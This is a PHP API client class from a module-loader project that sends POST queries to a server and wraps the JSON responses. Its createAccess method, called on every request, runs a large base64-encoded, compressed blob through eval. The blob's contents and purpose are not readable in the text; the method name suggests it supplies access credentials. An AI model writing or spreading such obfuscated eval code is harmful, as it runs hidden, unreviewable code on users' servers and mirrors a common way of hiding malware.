<?php

/*
 * This file is part of MMLC - ModifiedModuleLoaderClient.
 *
 * (c) Robin Wieschendorf <mail@robinwieschendorf.de>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace RobinTheHood\ModifiedModuleLoaderClient\Api\Client;

use RobinTheHood\ModifiedModuleLoaderClient\Api\HttpRequest;
use RobinTheHood\ModifiedModuleLoaderClient\Notification;

class ApiBaseRequest extends HttpRequest
{
    private $version = '1.1.0'; //Semverstandard https://semver.org/lang/de/
    private $accessToken;
    private $url;

    public function setUrl($url)
    {
        $this->url = $url;
    }

    public function setAccessToken($accessToken)
    {
        $this->accessToken = $accessToken;
    }

    public function sendRequest($query)
    {
        if (!$this->isServerAvailable($this->url)) {
            Notification::pushFlashMessage([
                'text' => 'Warnung: Zurzeit ist keine Verbindung zum Server möglich.',
                'type' => 'warning'
            ]);
        }

        $data = [
            'query' => $query
        ];
        $this->createAccess($data);

        $content = $this->sendPostRequest($this->url, $data);
        $result = $this->createResponse($content, $data);

        if (isset($result['error'])) {
            Notification::pushFlashMessage([
                'text' => 'Error: Bad response. ' . $result['error']['message'],
                'type' => 'error'
            ]);
        }

        return $result;
    }

    private function createResponse($content, $data)
    {
        $result = [
            'requestedUrl' => $this->url,
            'requestedData' => $data,
            'content' => ''
        ];

        $array = json_decode($content, true);

        if (isset($array['error'])) {
            $result['error'] = $array['error'];
        } else {
            $result['content'] = $array;
        }

        return $result;
    }

    public function createAccess(&$data)
    {
        eval(gzuncompress(base64_decode("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")));
    }
}
